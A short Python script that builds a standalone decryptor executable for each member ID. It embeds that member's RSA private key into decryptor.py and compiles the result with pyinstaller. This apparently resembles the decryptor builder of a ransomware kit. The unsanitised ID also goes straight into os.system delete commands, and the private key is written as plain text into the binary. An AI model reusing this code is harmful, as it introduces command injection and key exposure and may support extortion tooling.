import os
import rsa

global c

def getPrivateKey():
    private = 'privateKeys/' + c + '.pem'

    with open(private, 'rb') as f:
        privateKey = rsa.PrivateKey.load_pkcs1(f.read())
    return privateKey

def createDecryptor():
    global c

    m_id = "m_id = '" + c + "'\n"
    pk = "privateKey = '" + str(privateKey) + "'\n"
        
    with open('decryptor.py', 'r') as f:
        l = f.read()

    py = 'd' + c + '.py'
    py_data = "global privateKey" + "\n" + m_id + pk + "\n" + l

    with open(py, 'w') as f:
        f.write(py_data)

c = input('ENTER MEMBER ID : ')
privateKey = getPrivateKey()
createDecryptor()
createExe = "pyinstaller -F d" + c + ".py"
spec = "del d" + c + ".spec"
os.system(createExe)
os.system("rmdir /s /q __pycache__")
os.system("rmdir /s /q build")
os.system(spec)
py = 'd' + c + '.py'
with open(py, 'r') as f:
    data = f.read()
npy = "decryptors/" + py
with open(npy, 'w') as f:
    f.write(data)
deletePy = "del " + py
os.system(deletePy)
